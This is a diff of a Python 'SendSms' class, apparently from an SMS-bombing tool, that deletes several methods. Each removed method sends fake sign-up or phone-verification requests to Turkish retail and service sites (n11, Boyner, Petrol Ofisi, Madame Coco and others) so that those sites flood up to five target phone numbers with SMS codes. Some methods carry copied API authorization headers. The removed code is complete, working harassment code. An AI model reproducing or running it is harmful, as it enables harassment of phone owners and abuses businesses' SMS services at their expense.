@@ -177,72 +177,7 @@ class SendSms():
 
 
 
-    #naosstars.com
-
-    def NaosStars(self):
-
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-
-        bos_olmayan = len([x for x in liste if x != "bos"])
-
-        uygulanan_nolar = 0
-
-        for numara in liste:
-
-            if numara != "bos":
-
-                try:
-
-                    naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
-
-                    "email": self.mail,
-
-                    "first_name": "Memati",
-
-                    "last_name": "Bas",
-
-                    "password": "31ABC..abc31",
-
-                    "date_of_birth": "1975-12-31",
-
-                    "phone": f"0{numara}",
-
-                    "gender": "male",
-
-                    "kvkk": "true",
-
-                    "contact": "true",
-
-                    "confirm": "true"
-
-                })
-
-                    if naosstars.status_code == 202:
-
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> shop.naosstars.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
-
-                        self.adet += 1
-
-                        self.toplam_sms += 1
-
-                    else:
-
-                       raise
-
-                except:
-
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> shop.naosstars.com "+numara)
-
-                uygulanan_nolar += 1
-
-                if uygulanan_nolar == bos_olmayan:
-
-                    break
-
-                else:
-
-                    continue
-
+    
           
    
 
@@ -397,165 +332,15 @@ class SendSms():
             
 
 
-    #boyner.com
+    
 
-    def Boyner(self):
-
-            
-
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-
-        bos_olmayan = len([x for x in liste if x != "bos"])
-
-        uygulanan_nolar = 0
-
-        for numara in liste:
-
-            if numara != "bos":
-
-                try:
-
-                    url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
-
-                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
-
-                    json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": numara, "day": "31", "Email": self.mail, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
-
-                    r = requests.post(url, headers=headers, json=json)
-
-                    if r.json()["Success"] == True:
-
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> boyner.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
-
-                        self.adet += 1
-
-                        self.toplam_sms += 1
-
-                    else:
-
-                        raise
-
-                except:
-
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> boyner.com "+numara)
-
-                uygulanan_nolar += 1
-
-                if uygulanan_nolar == bos_olmayan:
-
-                    break
-
-            else:
-
-                continue
-
-            
+    
 
             
 
     
 
-    #buyursungelsin.com
-
-    def Buyur(self):
-
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-
-        bos_olmayan = len([x for x in liste if x != "bos"])
-
-        uygulanan_nolar = 0
-
-        for numara in liste:
-
-            if numara != "bos":
-
-                try:
-
-                    url = "https://app.buyursungelsin.com:443/api/customer/form/check"
-
-                    headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
-
-                    data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{numara}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
-
-                    r = requests.post(url, headers=headers, data=data)
-
-                    if (r.status_code) == 200:
-
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> app.buyursungelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
-
-                        self.adet += 1
-
-                        self.toplam_sms += 1
-
-                    else:
-
-                        raise
-
-                except:
-
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.buyursungelsin.com "+numara)
-
-                uygulanan_nolar += 1
-
-                if uygulanan_nolar == bos_olmayan:
-
-                    break
-
-            else:
-
-                continue
-
-            
-
     
-
-    #idealdata.com.tr
-
-    def Osmanlideal(self):
-
-
-
-
-
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-
-        bos_olmayan = len([x for x in liste if x != "bos"])
-
-        uygulanan_nolar = 0
-
-        for numara in liste:
-
-            if numara != "bos":
-
-                try:
-
-                    r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{numara}")
-
-                    if r.status_code == 200:
-
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> osmgck.idealdata.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
-
-                        self.adet += 1
-
-                        self.toplam_sms += 1
-
-                    else:
-
-                        raise
-
-                except:
-
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> osmgck.idealdata.com.tr "+numara)
-
-                uygulanan_nolar += 1
-
-                if uygulanan_nolar == bos_olmayan:
-
-                    break
-
-            else:
-
-                continue
 
             
 
@@ -612,55 +397,7 @@ class SendSms():
 
 
 
-    #ikinciyeni.com
-
-    def IkinciYeni(self):
-
-            
-
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-
-        bos_olmayan = len([x for x in liste if x != "bos"])
-
-        uygulanan_nolar = 0
-
-        for numara in liste:
-
-            if numara != "bos":
-
-                try:
-
-                    url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
-
-                    json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": numara}
-
-                    r = requests.post(url, json=json)
-
-                    if (r.json()["isSucceed"]) == True:
-
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apigw.ikinciyeni.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
-
-                        self.adet += 1
-
-                        self.toplam_sms += 1
-
-                    else:
-
-                        raise
-
-                except:
-
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apigw.ikinciyeni.com "+numara)
-
-                uygulanan_nolar += 1
-
-                if uygulanan_nolar == bos_olmayan:
-
-                    break
-
-            else:
-
-                continue
+    
 
             
 
@@ -774,57 +511,7 @@ class SendSms():
             
 
 
-    #petrolofisi.com.tr
-
-    def PetrolOfisi(self):
-
-            
-
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-
-        bos_olmayan = len([x for x in liste if x != "bos"])
-
-        uygulanan_nolar = 0
-
-        for numara in liste:
-
-            if numara != "bos":
-
-                try:
-
-                    url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
-
-                    headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
-
-                    json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{numara}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
-
-                    r = requests.post(url, headers=headers, json=json)
-
-                    if r.status_code == 204:
-
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilapi.petrolofisi.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
-
-                        self.adet += 1
-
-                        self.toplam_sms += 1
-
-                    else:
-
-                        raise
-
-                except:
-
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilapi.petrolofisi.com.tr "+numara)
-
-                uygulanan_nolar += 1
-
-                if uygulanan_nolar == bos_olmayan:
-
-                    break
-
-            else:
-
-                continue
+    
 
             
 
@@ -889,57 +576,7 @@ class SendSms():
     
 
 
-    #n11.com
-
-    def N11(self):
-
-            
-
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-
-        bos_olmayan = len([x for x in liste if x != "bos"])
-
-        uygulanan_nolar = 0
-
-        for numara in liste:
-
-            if numara != "bos":
-
-                try:
-
-                    url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
-
-                    headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
-
-                    json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": numara, "userType": "BUYER"}
-
-                    r = requests.post(url, headers=headers, json=json)
-
-                    if (r.json()["isSuccess"]) == True:
-
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.n11.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
-
-                        self.adet += 1
-
-                        self.toplam_sms += 1
-
-                    else:
-
-                        raise
-
-                except:
-
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.n11.com "+numara)
-
-                uygulanan_nolar += 1
-
-                if uygulanan_nolar == bos_olmayan:
-
-                    break
-
-            else:
-
-                continue
+    
 
             
 
@@ -1001,109 +638,12 @@ class SendSms():
 
 
 
-    #madamecoco.com
-
-    def Madame(self):
-
-            
-
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-
-        bos_olmayan = len([x for x in liste if x != "bos"])
-
-        uygulanan_nolar = 0
-
-        for numara in liste:
-
-            if numara != "bos":
-
-                try:
-
-                    url = "https://www.madamecoco.com:443/users/registration/"
-
-                    headers = {"Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.madamecoco.com/", "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"}
-
-                    data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
-
-                    r = requests.post(url, headers=headers, data=data)
-
-                    if (r.status_code) == 202:
-
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> madamecoco.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
-
-                        self.adet += 1
-
-                        self.toplam_sms += 1
-
-                    else:
-
-                        raise
-
-                except:
-
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> madamecoco.com "+numara)
-
-                uygulanan_nolar += 1
-
-                if uygulanan_nolar == bos_olmayan:
-
-                    break
-
-            else:
-
-                continue
+    
 
             
 
             
 
-    #balikesiruludag.com.tr
-
-    def Buludag(self):
-
-            
-
-        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
-
-        bos_olmayan = len([x for x in liste if x != "bos"])
-
-        uygulanan_nolar = 0
-
-        for numara in liste:
-
-            if numara != "bos":
-
-                try:
-
-                    r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={numara}")
-
-                    if r.status_code == 200:
-
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bilet.balikesiruludag.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
-
-                        self.adet += 1
-
-                        self.toplam_sms += 1
-
-                    else:
-
-                        raise
-
-                except:
-
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bilet.balikesiruludag.com.tr "+numara)
-
-                uygulanan_nolar += 1
-
-                if uygulanan_nolar == bos_olmayan:
-
-                    break
-
-            else:
-
-                continue
-
-            
 
     
 
